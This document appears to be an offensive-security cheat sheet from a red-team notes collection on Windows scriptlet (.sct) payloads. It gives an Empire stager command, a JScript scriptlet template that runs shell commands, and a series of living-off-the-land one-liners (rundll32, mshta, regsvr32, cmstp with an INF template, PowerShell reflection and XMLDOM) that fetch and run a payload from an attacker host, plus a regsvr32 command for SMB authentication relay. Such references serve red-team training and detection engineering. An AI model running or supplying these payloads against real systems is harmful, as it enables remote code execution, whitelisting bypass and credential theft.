---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - living-off-the-land
  - T1117
  - windows
credits:
  - bohops
---
# Scriptlet

## 01 - Generate Payloads

### 1.1 - Generate a payload via Empire

TODO: Fill this info

```
(Empire) > usestager windows/launcher_sct
```

### Scriptlet Template

Fileless scriptlet payload template.

```xml
<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="Updater"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
    <script language="JScript">
        <![CDATA[
            var execute = new ActiveXObject("WScript.Shell").Run("<commands>");    
        ]]>
</script>
</registration>
</scriptlet>
```

## Execute Payload

### 01 - Command Prompt

#### 1.1 - `rundll32.exe`

```
C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http[s]://<attacker_IP>/payload.sct");window.close();
```

#### 1.2 - `mshta.exe`

```
C:\> mshta.exe javascript:execute=GetObject("script:http[s]://<attacker_IP>/payload.sct");execute.Exec();close();

C:\> mshta.exe vbscript:Close(Execute("GetObject(""script:http[s]://<attacker_IP>/payload.sct"")"))
```

#### 1.3 - `regsvr32.exe`

Execute a SCT dropper payload.

```
C:\> regsvr32.exe /s /u /i:payload.sct scrobj.dll
```

Execute a fileless payload.

```
C:\> regsvr32.exe /s /u /i:http[s]://<IP>[:PORT]/payload.sct scrobj.dll

C:\> regsvr32.exe /s /u /i:\\<attacker_IP>\payload.sct scrobj.dll
```

Execute command to perform SMB authentication relay.

```
C:\> regsvr32.exe /s /u /i:\\<attacker_IP>\@snare scrobj.dll
```

#### 1.4 - `cmstp.exe`

Fileless scriptlet payload template

```
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http[s]://<IP>[:PORT]/payload.sct

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="Yay"
ShortSvcName="Yay"
```

Execute payload.

```
C:\> cmstp.exe /ni /s payload.inf
```

Execute fileless payload.

```
C:\> cmstp.exe /ni /s http[s]://<IP>[:PORT]/payload.inf
```

### 02 - PowerShell

```powershell
[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject("script:http[s]://<attacker_IP>/payload.sct").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
```

Another PowerShell Assembly Reflection SCT Code Execution Example with `Microsoft.VisualBasic.Interaction`

```powershell
[Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:http[s]://<attacker_IP>/payload.sct').Exec(0)
```

XMLDOM Remote Scriptlet.

```powershell
$xml = [activator]::CreateInstance([Type]::GetTypeFromCLSID("88d969c5-f192–11d4-a65f-0040963251e5"))
$xml.async = $false 
$xml.load("http[s]://<attacker_IP>/payload.sct")
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/PE Execution/DLL/Manual]]

### LOLBAS

- [LOLBAS: Regsvr32](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)

- [LOLBAS: cmstp](https://lolbas-project.github.io/lolbas/Binaries/Cmstp/)

### Hacktricks

- [Hacktricks: Windows Reverse Shells](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/reverse-shells/windows.html)

### Red Team Notes

- [Red Team Notes: Code Execution - Regsvr32](https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo)

- [Red Team Notes: CMSTP](https://www.ired.team/offensive-security/code-execution/t1191-cmstp-code-execution)

### 0xsp

- [0xsp: handy techniques to bypass environment restrictions](https://0xsp.com/offensive/handy-techniques-to-bypass-environment-restrictions/)